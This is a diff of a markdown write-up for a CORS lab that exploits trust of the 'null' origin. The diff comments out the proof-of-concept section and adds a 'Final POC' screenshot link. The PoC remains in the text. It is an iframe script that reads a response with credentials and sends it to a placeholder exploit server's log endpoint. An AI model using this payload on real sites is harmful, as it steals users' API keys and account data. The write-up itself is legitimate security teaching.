@@ -55,7 +55,7 @@
 ## Conclusion
 This lab highlights the importance of properly configuring CORS policies to avoid unintended trust of insecure origins like `null`. Servers should avoid reflecting arbitrary origins in the `Access-Control-Allow-Origin` header when `Access-Control-Allow-Credentials` is enabled.
 
-## PoC Code
+<!--## PoC Code
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
@@ -68,7 +68,8 @@ This lab highlights the importance of properly configuring CORS policies to avoi
         location = 'YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
-```
+``` -->
+
 ![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2a.PNG)
 
 API Key Decoded
@@ -77,3 +78,6 @@ API Key Decoded
 
 Old POC
 ![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2c.PNG)
+
+Final POC
+![Basic Origin Reflection Attack Lab 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab2d.PNG)
